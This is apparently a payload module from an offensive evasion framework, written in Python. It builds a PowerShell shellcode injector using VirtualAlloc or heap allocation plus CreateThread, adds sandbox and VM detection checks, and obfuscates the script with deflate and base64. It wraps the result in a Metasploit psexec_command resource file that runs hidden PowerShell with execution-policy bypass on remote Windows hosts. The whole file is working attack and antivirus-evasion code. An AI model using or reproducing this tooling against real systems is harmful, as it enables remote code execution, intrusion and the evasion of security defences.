"""

Powershell method to inject inline shellcode.
Builds a metasploit .rc resource file to psexec the powershell command easily

Original concept from Matthew Graeber: http://www.exploit-monday.com/2011/10/exploiting-powershells-features-not.html

Note: the architecture independent invoker was developed independently from
    https://www.trustedsec.com/may-2013/native-powershell-x86-shellcode-injection-on-64-bit-platforms/

Port to the msf resource file by @harmj0y

"""


from Tools.Evasion.evasion_common import evasion_helpers
from Tools.Evasion.evasion_common import gamemaker
from Tools.Evasion.evasion_common import shellcode_help


class PayloadModule:

    def __init__(self, cli_obj):
        # required
        self.description = "PowerShell VirtualAlloc method for inline shellcode injection that makes a Metasploit psexec_command .rc script"
        self.rating = "Excellent"
        self.language = "powershell"
        self.extension = "rc"
        self.name = "PowerShell psexec_command stager"
        self.path = "powershell/shellcode_inject/psexec_virtual"
        self.cli_opts = cli_obj
        self.shellcode = shellcode_help.Shellcode(cli_obj)
        self.payload_source_code = ''
        if cli_obj.ordnance_payload is not None:
            self.payload_type = cli_obj.ordnance_payload
        elif cli_obj.msfvenom is not None:
            self.payload_type = cli_obj.msfvenom
        elif not cli_obj.tool:
            self.payload_type = ''
        self.cli_shellcode = False

        # options we require user ineraction for- format is {Option : [Value, Description]]}
        self.required_options = {
            "INJECT_METHOD"  : ["Virtual", "Virtual, Void, or Heap"],
            "HOSTNAME"       : ["X", "Optional: Required system hostname"],
            "DOMAIN"         : ["X", "Optional: Required internal domain"],
            "PROCESSORS"     : ["X", "Optional: Minimum number of processors"],
            "USERNAME"       : ["X", "Optional: The required user account"],
            "USERPROMPT"     : ["FALSE", "Window pops up prior to payload"],
            "MINRAM"         : ["FALSE", "Require a minimum of 3 gigs of RAM"],
            "UTCCHECK"       : ["FALSE", "Check that system isn't using UTC time zone"],
            "VIRTUALPROC"    : ["FALSE", "Check for known VM processes"],
            "MINBROWSERS"    : ["FALSE", "Minimum of 2 browsers"],
            "BADMACS"        : ["FALSE", "Checks for known bad mac addresses"],
            "MINPROCESSES"   : ["X", "Minimum number of processes running"],
            "SLEEP"          : ["X", "Optional: Sleep \"Y\" seconds, check if accelerated"]
        }

    def psRaw(self):

        checks, num_ends = gamemaker.senecas_games(self)
        # Generate the shellcode
        if not self.cli_shellcode:
            Shellcode = self.shellcode.generate(self.cli_opts)
            if self.shellcode.msfvenompayload:
                self.payload_type = self.shellcode.msfvenompayload
            elif self.shellcode.payload_choice:
                self.payload_type = self.shellcode.payload_choice
                self.shellcode.payload_choice = ''
            # assume custom shellcode
            else:
                self.payload_type = 'custom'
        else:
            Shellcode = self.cli_shellcode
        Shellcode = ",0".join(Shellcode.split("\\"))[1:]

        if self.required_options["INJECT_METHOD"][0].lower() == "virtual":
            baseString = """$c = @"
[DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr w, uint x, uint y, uint z);
[DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr u, uint v, IntPtr w, IntPtr x, uint y, IntPtr z);
[DllImport("msvcrt.dll")] public static extern IntPtr memset(IntPtr x, uint y, uint z);
"@\n"""

            baseString += """Function Get-ProcAddress
{
    Param
    (
        [OutputType([IntPtr])]

        [Parameter( Position = 0, Mandatory = $True )]
        [String]
        $Module,

        [Parameter( Position = 1, Mandatory = $True )]
        [String]
        $Procedure
    )

    # Get a reference to System.dll in the GAC
    $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
        Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
    $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
    # Get a reference to the GetModuleHandle and GetProcAddress methods
    $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
    $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress')
    # Get a handle to the module specified
    $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
    $tmpPtr = New-Object IntPtr
    $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)

    # Return the address of the function
    Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
}
Function Get-DelegateType
{
    Param
    (
        [OutputType([Type])]

        [Parameter( Position = 0)]
        [Type[]]
        $Parameters = (New-Object Type[](0)),

        [Parameter( Position = 1 )]
        [Type]
        $ReturnType = [Void]
    )

    $Domain = [AppDomain]::CurrentDomain
    $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
    $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
    $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
    $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
    $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
    $MethodBuilder.SetImplementationFlags('Runtime, Managed')

    Write-Output $TypeBuilder.CreateType()
}\n"""

            baseString += """$wut = New-Object System.Object
$VirtualProtectAddr = Get-ProcAddress kernel32.dll VirtualProtect
$VirtualProtectDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
$why = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualProtectAddr, $VirtualProtectDelegate)
$wut | Add-Member NoteProperty -Name VirtualProtect -Value $why\n"""

            baseString += checks
            baseString += """$o = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru
$x=$o::VirtualAlloc(0,0x1000,0x3000,0x04); [Byte[]]$sc = %s;
for ($i=0;$i -le ($sc.Length-1);$i++) {$o::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1) | out-null;}
$here=$wut.VirtualProtect.Invoke($x, [UInt32]0x1000, [UInt32]0x20, [Ref]0);
$z=$o::CreateThread(0,0,$x,0,0,0); Start-Sleep -Second 100000""" % (Shellcode)

        elif self.required_options["INJECT_METHOD"][0].lower() == "heap":
            baseString = """$c = @"
[DllImport("kernel32.dll")] public static extern IntPtr HeapCreate(uint x, uint y, uint z);
[DllImport("kernel32.dll")] public static extern IntPtr HeapAlloc(IntPtr w, uint x, uint y);
[DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr u, uint v, IntPtr w, IntPtr x, uint y, IntPtr z);
[DllImport("msvcrt.dll")] public static extern IntPtr memset(IntPtr x, uint y, uint z);
"@\n"""
            baseString += checks
            baseString += """$o = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru
[Byte[]]$sc = %s
$x=$o::HeapCreate(0x00040000,$sc.Length,0); $ct=$o::HeapAlloc($x,0x00000008,$sc.Length)
for ($i=0;$i -le ($sc.Length-1);$i++) {$o::memset([IntPtr]($ct.ToInt32()+$i), $sc[$i], 1) | out-null;}
$z=$o::CreateThread(0,0,$ct,0,0,0); Start-Sleep -Second 100000""" % (Shellcode)

        baseString += '}\n' * num_ends

        return baseString

    def generate(self):

        encoded = evasion_helpers.deflate(self.psRaw())

        payload_code = "use auxiliary/admin/smb/psexec_command\n"
        payload_code += "set COMMAND "
        payload_code += "if %PROCESSOR_ARCHITECTURE%==x86 ("
        payload_code += "powershell.exe -NoP -NonI -W Hidden -Command \\\"Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String(\\\\\\\"%s\\\\\\\")))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();\\\"" % (encoded)
        payload_code += ") else ("
        payload_code += "%%WinDir%%\\\\syswow64\\\\windowspowershell\\\\v1.0\\\\powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command \\\"Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String(\\\\\\\"%s\\\\\\\")))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();\\\")" % (encoded)

        self.payload_source_code = payload_code
        return
